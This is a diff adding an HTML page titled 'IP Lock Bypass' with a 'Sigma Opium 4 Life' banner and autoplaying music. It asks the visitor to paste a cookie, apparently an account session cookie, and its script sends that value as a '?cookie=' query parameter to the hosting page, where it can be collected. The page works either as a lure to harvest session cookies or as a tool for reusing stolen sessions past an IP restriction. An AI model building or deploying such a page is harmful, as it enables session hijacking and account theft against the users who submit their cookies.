@@ -1,0 +1,70 @@
+<html><head>
+    <title>IP Lock Bypass</title>
+    <style>
+        body {
+            background-image: url('https://i.ytimg.com/vi/PBuOVJYha3M/maxresdefault.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+            color: rgb(6, 255, 110); /* Changed text color to white */
+        }
+        input {
+            position: relative;
+            display: block;
+            margin: 50px auto;
+            width: 35%;
+            padding: 16px 30px;
+            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+            background-color: #00000000;
+            color: rgb(206, 21, 21);
+            border-radius: 15px;
+            transition: all 0.3s ease;
+            border-color: rgba(226, 25, 25, 0);
+        }      
+        button {
+            background-color: #000000;
+            border: none;
+            color: white;
+            padding: 13px 100px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 16px;
+            opacity: 0.6;
+            transition: 0.3s;
+            display: inline-block;
+            text-decoration: none;
+            cursor: pointer;
+            display: block;
+            margin: 59px auto;
+            font-family: cursive;
+            position: sticky;
+            object-position: 20%;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <h1>Sigma Opium 4 Life</h1>
+    </center>
+    <input name="cookie" id="cookie">
+    <button id="check">Click to be sigma</button><!-- Added audio tag for autoplaying the mp3 -->
+    <audio autoplay="">
+        <source src="https://cdn.discordapp.com/attachments/1203270941099036672/1206170238253801572/opiuj.mp3?ex=65db0892&is=65c89392&hm=1aec6da8d83054318d432a6f1e60cf1f244a50d0856d1cb2de1cc765584f47c1&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    
+
+    <script>
+        const check_box = document.getElementById('check');
+        const cookie_box = document.getElementById('cookie');
+        const dom = window.location.href;
+
+        check_box.addEventListener('click', async function(event) {
+            event.preventDefault();
+            let cookie = cookie_box.value;
+            window.location.href = '' + dom + '?cookie=' + cookie;
+        });
+    </script>
+
+</body></html>
